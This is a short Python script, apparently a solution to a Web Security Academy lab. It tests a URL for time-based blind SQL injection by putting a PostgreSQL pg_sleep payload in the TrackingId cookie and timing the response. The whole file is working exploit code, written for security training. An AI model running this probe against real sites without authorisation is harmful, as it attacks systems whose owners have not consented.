import requests
import sys



def time_based_sqli_check(url):
    try:
        payload ="' || (SELECT pg_sleep(10))--"
        response = requests.get(url, cookies={"TrackingId": payload}, timeout=20)

        if response.elapsed.total_seconds() > 9:
            print("(+) Time based SQL injection attack successfully completed.")
        else:
            print("(-) Attack has not been successfully carried out. Please check your url and try again.")

    except requests.exceptions.MissingSchema:
        print(f"Please enter a valid URL.")
        sys.exit(1)

    except requests.exceptions.Timeout:
        print("(-) Request timed out.")
        sys.exit(1)

    except requests.exceptions.RequestException as e:
        print(f"(-) An error has occurred: {e}")
        sys.exit(1)


def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: python3 {sys.argv[0]} <URL>")
        print(f"(+) Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
        sys.exit(1)

    url = sys.argv[1]
    print("(+) Attempting time based SQL Injection attack...")
    time_based_sqli_check(url)


if __name__ == "__main__":
    main()
